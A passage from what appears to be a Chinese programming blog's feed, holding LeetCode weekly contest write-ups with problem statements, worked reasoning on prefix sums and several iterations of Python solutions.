class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 3, startPos = [0,1], s = &quot;RRDDLU&quot;</span><br><span class="line">输出：[1,5,4,3,1,0]</span><br><span class="line">解释：机器人从 startPos 出发，并从第 i 条指令开始执行：</span><br><span class="line">- 0: &quot;RRDDLU&quot; 在移动到网格外之前，只能执行一条 &quot;R&quot; 指令。</span><br><span class="line">- 1:  &quot;RDDLU&quot; 可以执行全部五条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 2:   &quot;DDLU&quot; 可以执行全部四条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 3:    &quot;DLU&quot; 可以执行全部三条指令，机器人仍在网格内，最终到达 (0, 0) 。</span><br><span class="line">- 4:     &quot;LU&quot; 在移动到网格外之前，只能执行一条 &quot;L&quot; 指令。</span><br><span class="line">- 5:      &quot;U&quot; 如果向上移动，将会移动到网格外。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 2, startPos = [1,1], s = &quot;LURD&quot;</span><br><span class="line">输出：[4,1,0,0]</span><br><span class="line">解释：</span><br><span class="line">- 0: &quot;LURD&quot;</span><br><span class="line">- 1:  &quot;URD&quot;</span><br><span class="line">- 2:   &quot;RD&quot;</span><br><span class="line">- 3:    &quot;D&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = 1, startPos = [0,0], s = &quot;LRUD&quot;</span><br><span class="line">输出：[0,0,0,0]</span><br><span class="line">解释：无论机器人从哪条指令开始执行，都会移动到网格外。</span><br></pre></td></tr></table></figure><p>这道题，拿到手，我就直接上<code>if else</code>。分别对上下左右进行边界判断，如果字符串最终走完了，那么说明该字符串的指令都可以执行，如果执行到一半退出了，那么说明越界了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">executeInstructions</span><span class="params">(self, n, startPos, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type startPos: List[int]</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">          <span class="comment">#flag用来标记是否在字符串中间退出</span></span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            tmpPos = startPos[:]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i, len(s)):</span><br><span class="line">                <span class="keyword">if</span> s[j] == <span class="string">'L'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'R'</span>:</span><br><span class="line">                    tmpPos[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">1</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'U'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] -= <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &lt; <span class="number">0</span>:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> s[j] == <span class="string">'D'</span>:</span><br><span class="line">                    tmpPos[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> tmpPos[<span class="number">0</span>] &gt;= n:</span><br><span class="line">                        res.append(j-i)</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                res.append(len(s) - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>做第三题之前，我们先来做一下<code>Leetcode</code>1685题，第三题和这道题类似。</p><h4 id="有序数组中差绝对值之和"><a href="#有序数组中差绝对值之和" class="headerlink" title="有序数组中差绝对值之和"></a>有序数组中差绝对值之和</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">给你一个 非递减 有序整数数组 nums 。</span><br><span class="line">请你建立并返回一个整数数组 result，它跟 nums 长度相同，且result[i] 等于 nums[i] 与数组中所有其他元素差的绝对值之和。</span><br><span class="line">换句话说， result[i] 等于 sum(|nums[i]-nums[j]|) ，其中 0 &lt;= j &lt; nums.length 且 j != i （下标从 0 开始）。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,3,5]</span><br><span class="line">输出：[4,3,5]</span><br><span class="line">解释：假设数组下标从 0 开始，那么</span><br><span class="line">result[0] = |2-2| + |2-3| + |2-5| = 0 + 1 + 3 = 4，</span><br><span class="line">result[1] = |3-2| + |3-3| + |3-5| = 1 + 0 + 2 = 3，</span><br><span class="line">result[2] = |5-2| + |5-3| + |5-5| = 3 + 2 + 0 = 5。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [1,4,6,8,10]</span><br><span class="line">输出：[24,15,13,15,21]</span><br></pre></td></tr></table></figure><p>初看这道题，我眼前一亮，一上来就是一个双重循环。多么美妙的手法啊！写完之后，执行代码没有问题，点击提交，多么优雅！过了三秒，如下图所示，我知道我大意了。</p><p><img src="/2021/12/26/Leetcode第273场周赛write-up/1.png" alt="1"></p><p>思索数分钟后，我点击了<code>相关标签</code>这个选项，试图寻找一丝灵感。相关标签里写到了三个大字，前缀和。我恍然大悟。接下来，我将通过如下的思路来进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">解题思路：</span><br><span class="line">        因为是有序排列，因此后一个减去前一个肯定是正数，无论是否加绝对值</span><br><span class="line">        考虑nums = 2 3 5 6这四个数</span><br><span class="line">        res1 = |2-2|+|2-3|+|2-5|+|2-6|</span><br><span class="line">        从第二个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res1改为</span><br><span class="line">        res1 = 2-2+3-2+5-2+6-2 = sum(nums)-2*len(nums)</span><br><span class="line">        </span><br><span class="line">        res2 = |3-2|+|3-3|+|3-5|+|3-6|</span><br><span class="line">        从第三个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res2改为</span><br><span class="line">        res2 = 3-2+3-3+5-3+6-3，其中为了凑到sum(res1)</span><br><span class="line">        我们将 3-2 凑成 (2-3)+(3-2)*2</span><br><span class="line">        则res2 = sum(nums)-3*len(nums) + (3-2)*2</span><br><span class="line">        </span><br><span class="line">        res3 = |5-2|+|5-3|+|5-5|+|5-6|</span><br><span class="line">        从第四个绝对值开始，结果都要取反，不考虑相等的值</span><br><span class="line">        将res3改为</span><br><span class="line">        res3 = 5-2+5-3+5-5+6-5，其中为了凑到sum(res1)</span><br><span class="line">        我们将 5-2+5-3 凑成 (2-5+3-5)+(5-2+5-3)*2</span><br><span class="line">        则res2 = sum(nums)-5*len(nums) + (5-2+5-3)*2</span><br><span class="line">        </span><br><span class="line">        res4 = |6-2|+|6-3|+|6-5|+|6-6|</span><br><span class="line">        将res4改为</span><br><span class="line">        res4 = 6-2+6-3+6-5+6-6，其中为了凑到sum(res1)</span><br><span class="line">        我们将 6-2+6-3+6-5 凑成 (2-6+3-6+5-6)+(6-2+6-3+6-5)*2</span><br><span class="line">        则res2 = sum(nums)-6*len(nums) + (6-2+6-3+6-5)*2</span><br><span class="line">        </span><br><span class="line">        通过上述分析我们最终可以得到第i个数的结果为</span><br><span class="line">        res[i] = (sum(nums)-nums[i]*len(nums)+(nums[i]*i - sum(1...i))*2</span><br></pre></td></tr></table></figure><p>如果你看懂了上面的分析过程，那么代码写起来将会非常容易。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getSumAbsoluteDifferences</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        n = len(nums)</span><br><span class="line">        sums = sum(nums)</span><br><span class="line">        tmp_sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">            tmp_sum += nums[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>现在让我们回到本周周赛的第三题</p><h4 id="相同元素的间隔之和"><a href="#相同元素的间隔之和" class="headerlink" title="相同元素的间隔之和"></a>相同元素的间隔之和</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">给你一个下标从 0 开始、由 n 个整数组成的数组 arr 。</span><br><span class="line">arr 中两个元素的间隔定义为它们下标之间的 绝对差 。更正式地，arr[i]和arr[j] 之间的间隔是 |i - j|。</span><br><span class="line">返回一个长度为 n 的数组 intervals ，其中 intervals[i] 是 arr[i] 和 arr 中每个相同元素（与 arr[i] 的值相同）的 间隔之和 。</span><br><span class="line">注意：|x| 是 x 的绝对值。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [2,1,3,1,2,3,3]</span><br><span class="line">输出：[4,2,7,2,4,4,5]</span><br><span class="line">解释：</span><br><span class="line">- 下标 0 ：另一个 2 在下标 4 ，|0 - 4| = 4</span><br><span class="line">- 下标 1 ：另一个 1 在下标 3 ，|1 - 3| = 2</span><br><span class="line">- 下标 2 ：另两个 3 在下标 5 和 6 ，|2 - 5| + |2 - 6| = 7</span><br><span class="line">- 下标 3 ：另一个 1 在下标 1 ，|3 - 1| = 2</span><br><span class="line">- 下标 4 ：另一个 2 在下标 0 ，|4 - 0| = 4</span><br><span class="line">- 下标 5 ：另两个 3 在下标 2 和 6 ，|5 - 2| + |5 - 6| = 4</span><br><span class="line">- 下标 6 ：另两个 3 在下标 2 和 5 ，|6 - 2| + |6 - 5| = 5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：arr = [10,5,10,10]</span><br><span class="line">输出：[5,0,3,4]</span><br><span class="line">解释：</span><br><span class="line">- 下标 0 ：另两个 10 在下标 2 和 3 ，|0 - 2| + |0 - 3| = 5</span><br><span class="line">- 下标 1 ：只有这一个 5 在数组中，所以到相同元素的间隔之和是 0</span><br><span class="line">- 下标 2 ：另两个 10 在下标 0 和 3 ，|2 - 0| + |2 - 3| = 3</span><br><span class="line">- 下标 3 ：另两个 10 在下标 0 和 2 ，|3 - 0| + |3 - 2| = 4</span><br></pre></td></tr></table></figure><p>现在再看这道题，多么熟悉！由于我之前并没有做过1685这道题，所以我早上比赛的时候一脸懵逼，但是还是硬着头皮写了一下。我先讲一下我没有做1685这道题之前做这个题的思路。</p><ul><li>首先我肯定需要分组，按照相同的数字将他们的下标分在一组。</li><li>其次针对每一组数我都需要计算他们各自和组里其他数的绝对值之和。</li></ul><p>于是我写了如下代码，其中我通过字典的key来保存数字，value来保存数字的下标。之后对字典的value进行遍历，去计算组内每个数和其他数之间的绝对值之和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        print(d)</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> d.values():</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> value:</span><br><span class="line">                s = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> r <span class="keyword">in</span> value:</span><br><span class="line">                    s+=abs(v-r)</span><br><span class="line">                res[v] = s</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>最终还是超时了。。。。。</p><p>当我做了1685这道题之后，我明白了我需要改进的地方。对于字典分组这一块还是不需要改变的，只需要改进后面计算绝对值之和。改进后的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        res = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)):</span><br><span class="line">            <span class="keyword">if</span> arr[i] <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[arr[i]] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[arr[i]].append(i)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>最终还是超时了。。。。。</p><p>我突然感觉眼前一片黑暗，这特么也能超时？？？于是我打算优化一下前面字典分组这一块，优化代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i,v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">            <span class="keyword">if</span> v <span class="keyword">not</span> <span class="keyword">in</span> d.keys():</span><br><span class="line">                d[v] = [i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>梅开三度，还是超时。。。于是我看了一下题解是怎么写的。其中有一个<code>python</code>的解法跟我这个差不太多，我借用了一下人家对于字典分组这块的写法，最终代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDistances</span><span class="params">(self, arr)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        d = collections.defaultdict(list)</span><br><span class="line">        ans = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i , v <span class="keyword">in</span> enumerate(arr):</span><br><span class="line">          d[v].append(i)</span><br><span class="line">        result = [<span class="number">0</span>] * len(arr)</span><br><span class="line">        <span class="keyword">for</span> nums <span class="keyword">in</span> d.values():</span><br><span class="line">            res = []</span><br><span class="line">            n = len(nums)</span><br><span class="line">            sums = sum(nums)</span><br><span class="line">            tmp_sum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                res.append(sums - nums[i] * n + (nums[i] * i - tmp_sum) * <span class="number">2</span>)</span><br><span class="line">                tmp_sum += nums[i]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">                result[nums[i]] = res[i]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>终于通过了😭😭😭，特么的，同样都是字典，为啥原生的字典和<code>collections</code>模块中的字典差距就这么大呢。。。</p><p><img src="/2021/12/26/Leetcode第273场周赛write-up/2.png" alt="2"></p><h4 id="还原原数组"><a href="#还原原数组" class="headerlink" title="还原原数组"></a>还原原数组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Alice 有一个下标从 0 开始的数组 arr ，由 n 个正整数组成。她会选择一个任意的 正整数 k 并按下述方式创建两个下标从 0 开始的新整数数组 lower 和 higher ：</span><br><span class="line">对每个满足 0 &lt;= i &lt; n 的下标 i ，lower[i] = arr[i] - k</span><br><span class="line">对每个满足 0 &lt;= i &lt; n 的下标 i ，higher[i] = arr[i] + k</span><br><span class="line">不幸地是，Alice 丢失了全部三个数组。但是，她记住了在数组 lower 和 higher 中出现的整数，但不知道每个整数属于哪个数组。请你帮助 Alice 还原原数组。</span><br><span class="line">给你一个由 2n 个整数组成的整数数组 nums ，其中 恰好 n 个整数出现在 lower ，剩下的出现在 higher ，还原并返回 原数组 arr 。如果出现答案不唯一的情况，返回 任一 有效数组。</span><br><span class="line">注意：生成的测试用例保证存在 至少一个 有效数组 arr 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [2,10,6,4,8,12]</span><br><span class="line">输出：[3,7,11]</span><br><span class="line">解释：</span><br><span class="line">如果 arr = [3,7,11] 且 k = 1 ，那么 lower = [2,6,10] 且 higher = [4,8,12] 。</span><br><span class="line">组合 lower 和 higher 得到 [2,6,10,4,8,12] ，这是 nums 的一个排列。</span><br><span class="line">另一个有效的数组是 arr = [5,7,9] 且 k = 3 。在这种情况下，lower = [2,4,6] 且 higher = [8,10,12] 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [1,1,3,3]</span><br><span class="line">输出：[2,2]</span><br><span class="line">解释：</span><br><span class="line">如果 arr = [2,2] 且 k = 1 ，那么 lower = [1,1] 且 higher = [3,3] 。</span><br><span class="line">组合 lower 和 higher 得到 [1,1,3,3] ，这是 nums 的一个排列。</span><br><span class="line">注意，数组不能是 [1,3] ，因为在这种情况下，获得 [1,1,3,3] 唯一可行的方案是 k = 0 。</span><br><span class="line">这种方案是无效的，k 必须是一个正整数。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [5,435]</span><br><span class="line">输出：[220]</span><br><span class="line">解释：</span><br><span class="line">唯一可行的组合是 arr = [220] 且 k = 215 。在这种情况下，lower = [5] 且 higher = [435] 。</span><br></pre></td></tr></table></figure><p>这道题嘛！告辞。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;反转两次的数字&quot;&gt;&lt;a href=&quot;#反转两次的数字&quot; class=&quot;headerlink&quot; title=&quot;反转两次的数字&quot;&gt;&lt;/a&gt;反转两次的数字&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="elssm.github.io/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode第272场周赛write up</title>
    <link href="elssm.github.io/2021/12/19/Leetcode%E7%AC%AC272%E5%9C%BA%E5%91%A8%E8%B5%9Bwrite-up/"/>
    <id>elssm.github.io/2021/12/19/Leetcode第272场周赛write-up/</id>
    <published>2021-12-19T04:42:32.000Z</published>
    <updated>2021-12-20T09:29:16.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="找出数组中的第一个回文字符串"><a href="#找出数组中的第一个回文字符串" class="headerlink" title="找出数组中的第一个回文字符串"></a>找出数组中的第一个回文字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">给你一个字符串数组 words ，找出并返回数组中的 第一个回文字符串 。如果不存在满足要求的字符串，返回一个 空字符串 &quot;&quot; 。</span><br><span class="line">回文字符串 的定义为：如果一个字符串正着读和反着读一样，那么该字符串就是一个 回文字符串 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;abc&quot;,&quot;car&quot;,&quot;ada&quot;,&quot;racecar&quot;,&quot;cool&quot;]</span><br><span class="line">输出：&quot;ada&quot;</span><br><span class="line">解释：第一个回文字符串是 &quot;ada&quot; 。</span><br><span class="line">注意，&quot;racecar&quot; 也是回文字符串，但它不是第一个。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：words = [&quot;notapalindrome&quot;,&quot;racecar&quot;]</span><br><span class="line">输出：&quot;racecar&quot;</span><br><span class="line">解释：第一个也是唯一一个回文字符串是 &quot;racecar&quot; 。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 